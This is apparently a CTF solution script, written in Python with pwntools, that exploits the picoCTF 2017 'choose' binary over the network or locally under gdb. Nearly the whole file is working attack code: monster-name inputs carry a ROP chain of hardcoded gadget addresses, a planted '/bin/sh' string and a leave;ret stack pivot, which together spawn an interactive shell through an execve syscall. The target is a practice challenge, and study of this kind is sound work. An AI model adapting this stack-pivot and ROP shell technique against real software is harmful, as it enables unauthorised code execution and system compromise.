#!/usr/bin/env python
#
# @author: GuilT

from pwn import *
import sys

if len(sys.argv) > 1:
    conn = remote('shell2017.picoctf.com',17069)
    offset = 0xffffdc7c - 0xbffff97c
else:
    conn = process('./choose')
    gdb.attach(conn, 'b* 0x8049c67')
    offset = 0
    

for i in range(5):
    conn.sendline('u')
conn.sendline('t')  
for i in range(5):
    conn.sendline('u')
    
   
fourpops = 0x0804836b # : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
threepops = 0x0804836c # : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
popeax   = 0x0809ebfa # : pop eax ; pop ebx ; pop esi ; pop edi ; ret

# eax = 0xb
conn.sendline('ZZZZ' + p32(popeax) + p32(0xb))

# ecx = 0
conn.sendline(p32(0x0805c12c) + p32(fourpops))                  # : mov ecx, 0xffffffff ; cmovb eax, ecx ; ret
conn.sendline(p32(0x080dc51c) + p32(fourpops))                  # : inc ecx ; ret

# edx = 0
conn.sendline(p32(0x08048192) + p32(0x0808c1ad))                # : xor edx, edx ; pop ebx ; div esi ; pop esi ; pop edi ; pop ebp ; ret
conn.sendline(p32(0x080b12b8) + p32(fourpops))                  # : xchg eax, edx ; ret

# ebx = ptr to /bin/sh
conn.sendline('aa' + p32(0x0804aa5d) + p32(0xbffff93e + offset))# : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8

# int 0x80
conn.sendline(p32(0x0804a171))                                  # : int 0x80

# plant /bin/sh as the name of one monster
conn.sendline('/bin/sh\x00')

# filler to reach the ret ptr on the stack    
for i in range(2):
    conn.sendline(chr(ord('A')+i) * 12)
    
# pivot to the name of the first monster  (overwrites ret ptr) 
staging = 0xbffff89a + offset
pivotgadget = 0x08048d68 # : leave ; ret
conn.sendline('aa' + p32(staging) + p32(pivotgadget))

# play the stupid game until i die    
for i in range(21):
    conn.sendline('a')
    
conn.sendline('h')
conn.sendline('f')

# enjoy your shell!
conn.interactive()
